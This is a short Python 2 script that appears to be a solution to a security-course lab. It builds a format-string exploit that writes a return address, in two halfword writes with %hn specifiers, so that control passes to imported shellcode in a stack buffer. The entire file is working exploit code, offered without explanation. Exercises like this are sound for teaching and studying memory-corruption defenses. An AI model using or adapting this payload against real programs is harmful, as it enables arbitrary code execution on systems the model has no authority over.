from shellcode import shellcode
from struct import pack

ebp = 0xbffef468
buf_low = 0xec60
buf_up = 0xbffe

return_addr_low = pack("<I", ebp + 4)
return_addr_up = pack("<I", ebp + 6)

prepend = shellcode + '\x90' + return_addr_up + return_addr_low
num_up = buf_up - len(prepend)
num_low = buf_low - buf_up

target_up = "%" + str(num_up) + "x%10$hn"
target_low = "%" + str(num_low) + "x%11$hn"

print prepend + target_up + target_low
